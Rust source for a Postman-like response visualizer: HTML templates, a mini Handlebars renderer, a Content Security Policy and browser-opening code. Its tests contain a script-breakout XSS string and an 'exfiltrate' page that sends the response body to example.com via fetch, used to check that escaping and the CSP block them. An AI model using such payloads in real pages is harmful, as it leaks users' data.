//! Response visualizations: a request's HTML / JavaScript script, opened in the browser with the
//! response data (like Postman's Visualize tab).

use std::path::PathBuf;

use serde_json::{Map, Value};

use crate::net::ResponseData;

/// (title, script) offered in the Visualize tab.
pub const TEMPLATES: [(&str, &str); 4] =
    [("Table", TABLE), ("User cards", USER_CARDS), ("Bar chart of a field", BAR_CHART), ("Postman script (pm.visualizer.set)", POSTMAN)];

/// Used when a request has no script of its own.
pub const DEFAULT: &str = TABLE;

/// The templates of a flow: the request ones (they read `body`) and a view of the outputs / variables.
pub const FLOW_TEMPLATES: [(&str, &str); 5] = [
    ("Outputs and variables", OUTPUTS),
    ("Table (of body)", TABLE),
    ("User cards (of body)", USER_CARDS),
    ("Bar chart of a field (of body)", BAR_CHART),
    ("Postman script (pm.visualizer.set)", POSTMAN),
];

/// Postman's way: JavaScript building data for a Handlebars template.
const POSTMAN: &str = r#"// Postman-style visualization: JavaScript + a Handlebars template.
const items = [].concat(pm.response.json());

const template = `
<style>
  table { width: 100%; border-collapse: collapse; }
  th { background: #00babc; color: white; padding: 8px 12px; text-align: left; }
  td { padding: 6px 12px; border-bottom: 1px solid #eee; }
</style>
<h2>{{count}} items</h2>
<table>
  <tr>{{#each columns}}<th>{{this}}</th>{{/each}}</tr>
  {{#each rows}}
  <tr>{{#each this}}<td>{{this}}</td>{{/each}}</tr>
  {{else}}
  <tr><td>Nothing</td></tr>
  {{/each}}
</table>
`;

// The first 6 simple fields of the first item become the columns.
const columns = Object.keys(items[0] || {}).filter(k => typeof items[0][k] !== "object").slice(0, 6);
pm.visualizer.set(template, {
  count: items.length,
  columns,
  rows: items.map(it => columns.map(c => it[c])),
});
"#;

/// Used when a flow has no script of its own.
pub const FLOW_DEFAULT: &str = OUTPUTS;

const OUTPUTS: &str = r#"<!-- A flow run: its outputs (or all its variables), lists as tables. -->
<style>
  h2 { margin-top: 24px; } .ok { color: #2ecc71; } .ko { color: #e74c3c; }
  pre { background: #ecf0f1; padding: 8px; border-radius: 4px; overflow: auto; max-height: 300px; }
</style>
<h1 id="title"></h1>
<div id="out"></div>
<script>
const esc = (v) => String(v ?? "").replace(/[&<>"']/g, (c) => "&#" + c.charCodeAt(0) + ";");
const table = (rows) => {
  const cols = [...new Set(rows.slice(0, 100).flatMap(r => r && typeof r === "object" ? Object.keys(r) : ["value"]))];
  return `<table><tr>${cols.map(c => `<th>${esc(c)}</th>`).join("")}</tr>` + rows.map(r => `<tr>${cols.map(c => {
    const v = r && typeof r === "object" ? r[c] : r;
    return `<td>${v && typeof v === "object" ? `<code>${esc(JSON.stringify(v).slice(0, 120))}</code>` : esc(v)}</td>`;
  }).join("")}</tr>`).join("") + "</table>";
};
const show = (v) => Array.isArray(v) && v.length ? `<p>${v.length} items</p>` + table(v)
  : v && typeof v === "object" ? `<pre>${esc(JSON.stringify(v, null, 2))}</pre>` : `<p><b>${esc(v)}</b></p>`;
const shown = Object.keys(outputs).length ? outputs : vars;
document.getElementById("title").innerHTML = `${esc(flow.name)} <span class="${flow.ok ? "ok" : "ko"}">${flow.ok ? "✓" : "✗"}</span>`;
document.getElementById("out").innerHTML = Object.entries(shown).map(([k, v]) => `<h2>${esc(k)}</h2>${show(v)}`).join("");
</script>
"#;

/// JSON safe inside a `<script>` block: no `<` at all (a `</script>` would end it early, a `<!--<script`
/// keeps the real end from closing it). `<` only occurs in strings, where `\u003c` means the same.
fn js(v: &Value) -> String {
    v.to_string().replace('<', "\\u003c")
}

/// The page of a request: the response as `response` / `body` / `pm.response`, then the script.
#[cfg(test)]
pub fn page(title: &str, script: &str, r: &ResponseData) -> String {
    page_from(title, script, r, "")
}

/// [`page`], images allowed from `origin` too (the API the response came from: avatars…).
pub fn page_from(title: &str, script: &str, r: &ResponseData, origin: &str) -> String {
    let headers: Map<String, Value> = r.headers.iter().map(|(k, v)| (k.to_lowercase(), Value::String(v.clone()))).collect();
    let body = serde_json::from_str::<Value>(&r.body).unwrap_or_else(|_| Value::String(r.body.clone()));
    let data = serde_json::json!({ "status": r.status, "headers": headers, "body": body, "time": r.elapsed.as_millis() as u64 });
    html(title, script, &format!("window.response = {};\nwindow.__vars = {{}};", js(&data)), origin)
}

/// What a flow's visualization gets: its body. One output → that value; several → the outputs object;
/// none → every variable. So the request templates (which read `body`) work on flows too.
pub fn flow_body(outputs: &Map<String, Value>, vars: &Value) -> Value {
    match outputs.len() {
        0 => vars.clone(),
        1 => outputs.values().next().cloned().unwrap_or(Value::Null),
        _ => Value::Object(outputs.clone()),
    }
}

/// The page of a flow run: `flow` ({name, ok, outputs, vars}), `outputs`, `vars`, and `response` / `body` (see [`flow_body`]).
pub fn flow_page(title: &str, script: &str, ok: bool, outputs: &Map<String, Value>, vars: &Value) -> String {
    let flow = serde_json::json!({ "name": title, "ok": ok, "outputs": outputs, "vars": vars });
    let response = serde_json::json!({ "status": if ok { 200 } else { 500 }, "headers": {}, "body": flow_body(outputs, vars), "time": 0 });
    html(
        title,
        script,
        &format!(
            "window.flow = {};\nwindow.outputs = window.flow.outputs; window.vars = window.flow.vars; window.__vars = Object.assign({{}}, window.flow.vars, window.flow.outputs);\nwindow.response = {};",
            js(&flow),
            js(&response)
        ),
        "",
    )
}

/// A Postman-style script is JavaScript (`pm.visualizer.set(...)`); ours are HTML. Leading comments don't count.
pub fn is_javascript(script: &str) -> bool {
    let mut rest = script.trim_start();
    loop {
        if let Some(r) = rest.strip_prefix("//") {
            rest = r.split_once('\n').map(|(_, r)| r).unwrap_or("").trim_start();
        } else if let Some(r) = rest.strip_prefix("/*") {
            rest = r.split_once("*/").map(|(_, r)| r).unwrap_or("").trim_start();
        } else {
            break;
        }
    }
    !rest.is_empty() && !rest.starts_with('<')
}

/// Globals are set on `window` (not `const`), so a script may declare its own `const response = …`.
/// `pm` mimics Postman's visualizer API; templates are Handlebars (the real library when online, a small built-in one otherwise).
const RUNTIME: &str = r##"
window.body = window.response.body;
(function () {
  // Our own references: a script's `const response = …` shadows the global name for every script, ours included.
  const R = window.response, V = window.__vars;
  const headers = Object.assign(Object.create({ get(n) { return this[String(n).toLowerCase()]; }, has(n) { return String(n).toLowerCase() in this; } }), R.headers);
  let pending = null;
  window.pm = {
    response: { json: () => R.body, text: () => typeof R.body === "string" ? R.body : JSON.stringify(R.body),
                code: R.status, status: R.status, headers, responseTime: R.time },
    variables: { get: (k) => V[k] }, environment: { get: (k) => V[k] }, collectionVariables: { get: (k) => V[k] },
    visualizer: { set: (template, data, options) => { pending = { template: String(template), data: data === undefined ? {} : data }; } },
    getData: (cb) => cb(null, window.__data),
  };
  window.addEventListener("DOMContentLoaded", () => {
    if (!pending) return;
    const { template, data } = pending;
    window.__data = data;
    const show = (html) => {
      // The template may be a whole document with its own <script>s: replace the page with it (pm stays available).
      document.open(); document.write(html); document.close();
    };
    const fallback = () => { try { show(__hbs(template, data)); } catch (e) { document.body.innerHTML = "<pre>Template error: " + __hbs.esc(e.message) + "</pre>"; } };
    if (window.Handlebars) return show(Handlebars.compile(template)(data));
    const s = document.createElement("script");
    s.src = "https://cdnjs.cloudflare.com/ajax/libs/handlebars.js/4.7.8/handlebars.min.js";
    const timer = setTimeout(() => { s.onload = s.onerror = null; fallback(); }, 2500);
    s.onload = () => { clearTimeout(timer); try { show(Handlebars.compile(template)(data)); } catch (e) { fallback(); } };
    s.onerror = () => { clearTimeout(timer); fallback(); };
    document.head.appendChild(s);
  });
})();

// A small Handlebars for offline use: {{x}} {{{x}}} {{a.b}} {{this}} {{@index}} {{@key}} {{../x}}, #each #if #unless #with, {{else}}, comments.
function __hbs(tpl, data) {
  const re = /\{\{\{\s*([\s\S]+?)\s*\}\}\}|\{\{(~?)\s*([\s\S]+?)\s*(~?)\}\}/g;
  const root = { body: [] }, stack = [root];
  let last = 0, m;
  const top = () => stack[stack.length - 1];
  const target = () => (top().inElse ? top().inverse : top().body);
  while ((m = re.exec(tpl))) {
    if (m.index > last) target().push({ text: tpl.slice(last, m.index) });
    last = re.lastIndex;
    if (m[1] !== undefined) { target().push({ path: m[1].trim(), raw: true }); continue; }
    const tag = m[3].trim();
    if (tag.startsWith("!")) continue;
    if (tag.startsWith("#")) {
      const [name, ...args] = tag.slice(1).trim().split(/\s+/);
      const node = { name, arg: args.join(" ").replace(/\s+as\s+\|.*\|$/, ""), body: [], inverse: [], inElse: false };
      target().push(node); stack.push(node); continue;
    }
    if (tag.startsWith("/")) { if (stack.length > 1) stack.pop(); continue; }
    if (tag === "else" || tag === "^") { top().inElse = true; continue; }
    target().push({ path: tag });
  }
  if (last < tpl.length) target().push({ text: tpl.slice(last) });

  const truthy = (v) => Array.isArray(v) ? v.length > 0 : !!v;
  const lookup = (frames, path) => {
    path = path.trim();
    if (/^(['"]).*\1$/.test(path)) return path.slice(1, -1);
    if (/^-?\d+(\.\d+)?$/.test(path)) return Number(path);
    if (path === "true" || path === "false") return path === "true";
    let i = frames.length - 1;
    while (path.startsWith("../")) { path = path.slice(3); i = Math.max(0, i - 1); }
    const frame = frames[i];
    if (path.startsWith("@")) return frame.meta[path.slice(1)];
    if (path === "this" || path === ".") return frame.ctx;
    path = path.replace(/^this[./]/, "");
    let v = path.split(/[./]/).reduce((o, k) => (o == null ? undefined : o[k]), frame.ctx);
    // Not found here: look in the enclosing contexts (like Handlebars' compat mode).
    for (let j = i - 1; v === undefined && j >= 0 && !path.includes("."); j--) v = frames[j].ctx == null ? undefined : frames[j].ctx[path];
    return v;
  };
  const run = (nodes, frames) => nodes.map((n) => {
    if (n.text !== undefined) return n.text;
    if (n.name === undefined) {
      const v = lookup(frames, n.path);
      const s = v == null ? "" : typeof v === "object" ? JSON.stringify(v) : String(v);
      return n.raw ? s : __hbs.esc(s);
    }
    const v = lookup(frames, n.arg || "this");
    const sub = (ctx, meta) => run(n.body, frames.concat([{ ctx, meta: meta || {} }]));
    switch (n.name) {
      case "if": return truthy(v) ? run(n.body, frames) : run(n.inverse, frames);
      case "unless": return !truthy(v) ? run(n.body, frames) : run(n.inverse, frames);
      case "with": return v != null ? sub(v) : run(n.inverse, frames);
      default: {
        if (Array.isArray(v)) return v.length ? v.map((x, i) => sub(x, { index: i, first: i === 0, last: i === v.length - 1 })).join("") : run(n.inverse, frames);
        if (n.name === "each" && v && typeof v === "object") {
          const keys = Object.keys(v);
          return keys.length ? keys.map((k, i) => sub(v[k], { key: k, index: i, first: i === 0, last: i === keys.length - 1 })).join("") : run(n.inverse, frames);
        }
        return truthy(v) ? sub(v) : run(n.inverse, frames);
      }
    }
  }).join("");
  return run(root.body, [{ ctx: data, meta: {} }]);
}
__hbs.esc = (s) => String(s).replace(/[&<>"'`=]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;", "`": "&#x60;", "=": "&#x3D;" })[c]);
"##;

/// `data_js` sets `window.response` (and `window.__vars`); the runtime adds `body` and `pm`.
/// What a page may do. Scripts stay free (Postman templates write the page with their own `<script>`s,
/// Handlebars compiles with `new Function`), but the data can't leave: no fetch / XHR / WebSocket, images
/// only from the API the data came from (a script writing `<img src="https://elsewhere/?data">` gets
/// nothing out), scripts and styles only from the usual CDNs, no form posted.
fn csp(images: &str) -> String {
    let images = images.trim();
    let images = if images.starts_with("https://") || images.starts_with("http://") { format!(" {}", images.replace(['"', ';', ' '], "")) } else { String::new() };
    format!(
        "default-src 'none'; \
         script-src 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com; \
         style-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://fonts.googleapis.com; \
         font-src data: https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; \
         img-src data: blob:{images}; \
         connect-src 'none'; form-action 'none'; base-uri 'none'"
    )
}

fn html(title: &str, script: &str, data_js: &str, images: &str) -> String {
    let csp = csp(images);
    let title = title.replace('&', "&amp;").replace('<', "&lt;");
    // A Postman script is JavaScript: run it as such (a `</script>` in it would end the block early).
    let script = if is_javascript(script) { format!("<script>\n{}\n</script>", script.replace("</script", "<\\/script")) } else { script.to_owned() };
    format!(
        r#"<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="{csp}">
<title>{title}</title>
<style>
  body {{ font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 20px; color: #34495e; background: #fff; }}
  table {{ border-collapse: collapse; font-size: 13px; }}
  th, td {{ border-bottom: 1px solid #e4e7ea; padding: 6px 10px; text-align: left; vertical-align: top; }}
  th {{ background: #ecf0f1; cursor: pointer; position: sticky; top: 0; }}
  input {{ padding: 6px 8px; border: 1px solid #bdc3c7; border-radius: 4px; }}
</style>
<script>
{data_js}
{RUNTIME}
</script>
</head><body>
{script}
</body></html>
"#
    )
}

/// Writes the page in the data folder and opens it in the default browser.
pub fn open(title: &str, script: &str, r: &ResponseData, origin: &str) -> Result<PathBuf, String> {
    let script = if script.trim().is_empty() { DEFAULT } else { script };
    write_and_open(title, &page_from(title, script, r, origin))
}

/// A flow run's page (an empty script shows the outputs, or the variables).
pub fn open_flow(title: &str, script: &str, ok: bool, outputs: &Map<String, Value>, vars: &Value) -> Result<PathBuf, String> {
    let script = if script.trim().is_empty() { FLOW_DEFAULT } else { script };
    write_and_open(title, &flow_page(title, script, ok, outputs, vars))
}

fn write_and_open(title: &str, html: &str) -> Result<PathBuf, String> {
    let dir = crate::storage::dir().join("visualize");
    std::fs::create_dir_all(&dir).map_err(|e| format!("can't create {}: {e}", dir.display()))?;
    let name: String = title.chars().map(|c| if c.is_alphanumeric() || c == '-' { c } else { '_' }).take(60).collect();
    let path = dir.join(format!("{}.html", if name.is_empty() { "response".into() } else { name }));
    std::fs::write(&path, html).map_err(|e| format!("can't write {}: {e}", path.display()))?;
    open_in_browser(&path)?;
    Ok(path)
}

pub fn open_in_browser(path: &std::path::Path) -> Result<(), String> {
    #[cfg(target_os = "macos")]
    let mut cmd = std::process::Command::new("open");
    #[cfg(target_os = "windows")]
    let mut cmd = {
        let mut c = std::process::Command::new("cmd");
        c.args(["/C", "start", ""]);
        c
    };
    #[cfg(not(any(target_os = "macos", target_os = "windows")))]
    let mut cmd = std::process::Command::new("xdg-open");
    cmd.arg(path).spawn().map(|_| ()).map_err(|e| format!("can't open the browser: {e}"))
}

const TABLE: &str = r#"<!-- A sortable, filterable table of the response (a list, or one object). -->
<h3 id="title"></h3>
<input id="filter" placeholder="Filter rows…" autofocus>
<div id="out" style="margin-top:12px; overflow:auto"></div>
<script>
// The API's texts (team names, logins…) are shown as text, never run as HTML.
const esc = (v) => String(v ?? "").replace(/[&<>"']/g, (c) => "&#" + c.charCodeAt(0) + ";");
const rows = Array.isArray(body) ? body : [body];
const cols = [...new Set(rows.slice(0, 100).flatMap(r => r && typeof r === "object" ? Object.keys(r) : ["value"]))];
const cell = (v) => {
  if (v === null || v === undefined) return "";
  if (typeof v === "string" && /^https?:\/\/.*\.(png|jpe?g|gif|webp)$/i.test(v)) return `<img src="${esc(v)}" height="40">`;
  if (typeof v === "object") return `<code>${esc(JSON.stringify(v).slice(0, 120))}</code>`;
  return esc(v);
};
let sortKey = null, asc = true;
function render() {
  const q = document.getElementById("filter").value.toLowerCase();
  let shown = rows.filter(r => !q || JSON.stringify(r).toLowerCase().includes(q));
  if (sortKey) shown = [...shown].sort((a, b) => {
    const x = a?.[sortKey], y = b?.[sortKey];
    return (x > y ? 1 : x < y ? -1 : 0) * (asc ? 1 : -1);
  });
  document.getElementById("title").textContent = `${shown.length} / ${rows.length} rows · HTTP ${response.status}`;
  document.getElementById("out").innerHTML = `<table><tr>${cols.map(c => `<th data-k="${esc(c)}">${esc(c)}${c === sortKey ? (asc ? " ▲" : " ▼") : ""}</th>`).join("")}</tr>` +
    shown.map(r => `<tr>${cols.map(c => `<td>${cell(r && typeof r === "object" ? r[c] : r)}</td>`).join("")}</tr>`).join("") + "</table>";
  document.querySelectorAll("th").forEach(th => th.onclick = () => { asc = sortKey === th.dataset.k ? !asc : true; sortKey = th.dataset.k; render(); });
}
document.getElementById("filter").oninput = render;
render();
</script>
"#;

const USER_CARDS: &str = r#"<!-- Cards: one per element of a list (people, products…): its picture, name and a few fields. -->
<style>
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 14px; }
  .card { border: 1px solid #e3e3e8; border-radius: 10px; padding: 12px; text-align: center; }
  .card img { width: 96px; height: 96px; object-fit: cover; border-radius: 50%; background: #ececf1; }
  .name { font-weight: bold; color: #5b4bd1; }
  .small { color: #7a7d88; font-size: 12px; }
</style>
<div class="grid" id="grid"></div>
<script>
const esc = (v) => String(v ?? "").replace(/[&<>"']/g, (c) => "&#" + c.charCodeAt(0) + ";");
const items = Array.isArray(body) ? body : (Array.isArray(body?.data) ? body.data : [body]);
// The first field that looks like a picture, a name, then a few short ones.
const pick = (o, keys) => keys.map(k => o?.[k]).find(v => typeof v === "string" && v);
items.forEach(() => {});
document.getElementById("grid").innerHTML = items.map(o => {
  const img = pick(o, ["avatar", "avatar_url", "image", "picture", "photo", "thumbnail", "img"]) || o?.image?.link || "";
  const name = pick(o, ["name", "title", "username", "login", "displayname", "email"]) ?? o?.id ?? "?";
  const extra = Object.entries(o || {}).filter(([k, v]) => typeof v !== "object" && String(v).length < 40 && !["name", "title"].includes(k)).slice(0, 3);
  return `<div class="card">${img ? `<img src="${esc(img)}" alt="">` : ""}
    <div class="name">${esc(name)}</div>
    ${extra.map(([k, v]) => `<div class="small">${esc(k)}: ${esc(v)}</div>`).join("")}</div>`;
}).join("");
</script>
"#;

const BAR_CHART: &str = r#"<!-- Counts the values of one field (a path like status, product.name, store.slug). -->
<script>
const FIELD = "status";   // ← change me
</script>
<h3 id="title"></h3>
<div id="chart"></div>
<script>
const get = (o, path) => path.split(".").reduce((v, k) => v?.[k], o);
const counts = {};
for (const item of Array.isArray(body) ? body : [body]) {
  const v = String(get(item, FIELD) ?? "—");
  counts[v] = (counts[v] || 0) + 1;
}
const entries = Object.entries(counts).sort((a, b) => b[1] - a[1]);
const max = Math.max(1, ...entries.map(e => e[1]));
document.getElementById("title").textContent = `${FIELD} — ${entries.length} values`;
document.getElementById("chart").innerHTML = entries.map(([k, n]) => `
  <div style="display:flex; align-items:center; gap:8px; margin:4px 0">
    <div style="width:220px; text-align:right; font-size:13px">${k.replace(/[&<>"']/g, (c) => "&#" + c.charCodeAt(0) + ";")}</div>
    <div style="height:18px; width:${(n / max) * 60}%; background:#00babc; border-radius:3px"></div>
    <div style="font-size:12px; color:#888">${n}</div>
  </div>`).join("");
</script>
"#;

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    #[test]
    fn postman_scripts_are_javascript() {
        assert!(is_javascript("// Visualization Script\n\nconst response = pm.response.json();\nconst t = `<html>`;"));
        assert!(is_javascript("/* a */ pm.visualizer.set(`<p></p>`)"));
        assert!(!is_javascript("<!-- table -->\n<script>body</script>"));
        assert!(!is_javascript("<h3></h3>"));
        // Wrapped in <script>, with a `</script>` inside a template string kept from closing the block.
        let html = html("t", "const t = `<script>x</script>`;", "window.response = {};", "");
        assert!(html.contains("<script>\nconst t = `<script>x<\\/script>`;\n</script>"), "{html}");
        // Our data is on window, so a script may declare its own `const response`.
        assert!(html.contains("window.response = {};") && !html.contains("const response = {"));
        // The data can't be sent anywhere.
        assert!(html.contains("Content-Security-Policy") && html.contains("connect-src 'none'"), "{html}");
    }

    #[test]
    fn flow_pages() {
        let vars = serde_json::json!({ "a": 1 });
        let mut outputs = Map::new();
        assert_eq!(flow_body(&outputs, &vars), vars, "no output: every variable");
        outputs.insert("users".into(), serde_json::json!([{ "login": "x" }]));
        assert_eq!(flow_body(&outputs, &vars), serde_json::json!([{ "login": "x" }]), "one output: its value");
        outputs.insert("n".into(), serde_json::json!(1));
        assert!(flow_body(&outputs, &vars).is_object());
        let html = flow_page("My flow", "<p>x</p>", true, &outputs, &vars);
        assert!(html.contains("window.flow = ") && html.contains("window.outputs = window.flow.outputs") && html.contains("window.body = window.response.body"));
    }

    #[test]
    fn page_embeds_the_response_safely() {
        let r = ResponseData {
            status: 200,
            status_text: "OK".into(),
            elapsed: Duration::ZERO,
            size: 0,
            headers: vec![("X-Total".into(), "2".into())],
            body: r#"[{"login":"a</script><script>alert(1)"}]"#.into(),
            is_json: true,
            notes: Vec::new(),
            script: None,
        };
        let html = page("Users", "<p>hi</p>", &r);
        assert!(!html.contains("a</script>"), "a string must not close the script block");
        assert!(html.contains(r#""x-total":"2""#));
        assert!(html.contains("<p>hi</p>"));
    }
}

#[cfg(test)]
mod dump {
    use super::*;
    use std::time::Duration;

    /// `cargo test dump_pages -- --ignored`: writes the pages to $DUMP_DIR to check their JavaScript.
    #[test]
    #[ignore]
    fn dump_pages() {
        let dir = std::path::PathBuf::from(std::env::var("DUMP_DIR").unwrap());
        let vars = serde_json::json!({ "users": [{ "login": "a", "image": { "link": null } }], "n": 2 });
        let mut outputs = serde_json::Map::new();
        outputs.insert("users".into(), vars["users"].clone());
        // A Postman script (`USER_SCRIPT`) on an orders response.
        if let Ok(script) = std::env::var("USER_SCRIPT").and_then(|p| std::fs::read_to_string(p).map_err(|_| std::env::VarError::NotPresent)) {
            let body = r#"[{"status":"finished","created_at":"2026-09-01T10:05:00.000Z","user":{"login":"jdoe"},"product":{"name":"rake"},
              "teams":[{"name":"jdoe's group","status":"finished","users":[{"login":"jdoe"},{"login":"a<b"}]}]},
              {"status":"in_progress","created_at":"2026-10-01T08:00:00.000Z","user":{"login":"asmith"},"product":{"name":"rake"},"teams":[]}]"#;
            let r = crate::net::ResponseData {
                status: 200,
                status_text: "OK".into(),
                elapsed: std::time::Duration::ZERO,
                size: 0,
                headers: vec![("X-Total".into(), "2".into())],
                body: body.into(),
                is_json: true,
                notes: Vec::new(),
                script: None,
            };
            std::fs::write(dir.join("postman.html"), super::page("rake", &script, &r)).unwrap();
        }
        for (i, (_, script)) in super::FLOW_TEMPLATES.iter().enumerate() {
            std::fs::write(dir.join(format!("flow{i}.html")), super::flow_page("T", script, true, &outputs, &vars)).unwrap();
        }
    }

    /// Writes pages to `$FT_VISUALIZE_OUT` to open in a browser (the CSP and the templates together).
    #[test]
    #[ignore]
    fn write_pages_for_a_browser() {
        let Ok(out) = std::env::var("FT_VISUALIZE_OUT") else { return };
        let r = |body: &str| ResponseData {
            status: 200,
            status_text: "OK".into(),
            elapsed: Duration::from_millis(5),
            size: body.len(),
            headers: Vec::new(),
            body: body.into(),
            is_json: true,
            notes: Vec::new(),
            script: None,
        };
        let users =
            r#"[{"id": 1, "login": "jdoe", "displayname": "<b>J</b> Doe", "image": {"link": "https://cdn.example.com/users/x.jpg"}}, {"id": 2, "login": "asmith"}]"#;
        let pages = [
            ("table", TABLE),
            ("postman", "const t = `<table id=\"t\">{{#each rows}}<tr><td class=\"login\">{{login}}</td></tr>{{/each}}</table><script>document.body.dataset.ran = 'yes';</script>`;\npm.visualizer.set(t, { rows: pm.response.json() });"),
            ("exfiltrate", "<script>fetch('https://example.com/?d=' + JSON.stringify(body), { mode: 'no-cors' }).then(() => document.body.dataset.sent = 'yes', () => document.body.dataset.sent = 'blocked');</script>"),
        ];
        for (name, script) in pages {
            std::fs::write(format!("{out}/{name}.html"), page(name, script, &r(users))).unwrap();
        }
    }
}
